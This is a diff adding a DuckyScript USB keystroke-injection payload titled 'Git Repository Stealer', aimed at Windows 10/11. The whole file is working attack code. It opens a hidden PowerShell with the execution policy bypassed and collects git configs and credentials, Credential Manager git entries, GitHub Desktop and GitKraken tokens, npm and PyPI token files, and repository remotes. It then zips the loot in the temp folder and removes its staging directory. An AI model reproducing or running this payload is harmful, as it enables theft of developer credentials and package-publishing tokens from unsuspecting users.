@@ -1,0 +1,74 @@
+REM =============================================
+REM Title: Git Repository Stealer
+REM Author: bad-antics
+REM Description: Steal git configs, credentials and repo info
+REM Category: nullsec/exfil
+REM Target: Windows 10/11
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create loot directory
+STRING $d="$env:TEMP\gitloot";mkdir $d -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Global git config
+STRING if(Test-Path "$env:USERPROFILE\.gitconfig"){cp "$env:USERPROFILE\.gitconfig" "$d\gitconfig.txt"}
+ENTER
+DELAY 200
+
+REM Git credentials file
+STRING if(Test-Path "$env:USERPROFILE\.git-credentials"){cp "$env:USERPROFILE\.git-credentials" "$d\git-credentials.txt"}
+ENTER
+DELAY 200
+
+REM Windows Credential Manager git creds
+STRING cmdkey /list 2>$null|Select-String -Pattern "git"|Out-File "$d\credential_manager_git.txt"
+ENTER
+DELAY 300
+
+REM GitHub Desktop tokens
+STRING if(Test-Path "$env:APPDATA\GitHub Desktop"){Get-ChildItem "$env:APPDATA\GitHub Desktop" -Include "*.json" -Recurse|%{cp $_.FullName "$d\ghdesktop_$($_.Name)"}}
+ENTER
+DELAY 300
+
+REM GitKraken tokens
+STRING if(Test-Path "$env:APPDATA\.gitkraken"){cp -r "$env:APPDATA\.gitkraken\profiles" "$d\gitkraken" -Force 2>$null}
+ENTER
+DELAY 200
+
+REM Find all git repos and extract remotes
+STRING $repos=Get-ChildItem "$env:USERPROFILE" -Filter ".git" -Recurse -Hidden -Directory -ErrorAction SilentlyContinue|Select -First 20
+ENTER
+DELAY 500
+
+STRING $repos|%{$p=$_.Parent.FullName;$r=git -C $p remote -v 2>$null;if($r){"$p`n$r`n---"}}>>"$d\repos_found.txt"
+ENTER
+DELAY 500
+
+REM NPM tokens
+STRING if(Test-Path "$env:USERPROFILE\.npmrc"){cp "$env:USERPROFILE\.npmrc" "$d\npmrc.txt"}
+ENTER
+DELAY 200
+
+REM PyPI tokens
+STRING if(Test-Path "$env:USERPROFILE\.pypirc"){cp "$env:USERPROFILE\.pypirc" "$d\pypirc.txt"}
+ENTER
+DELAY 200
+
+REM Compress
+STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\gitcreds_$(hostname).zip" -Force
+ENTER
+DELAY 400
+
+STRING Remove-Item $d -Recurse -Force
+ENTER
+
+STRING exit
+ENTER
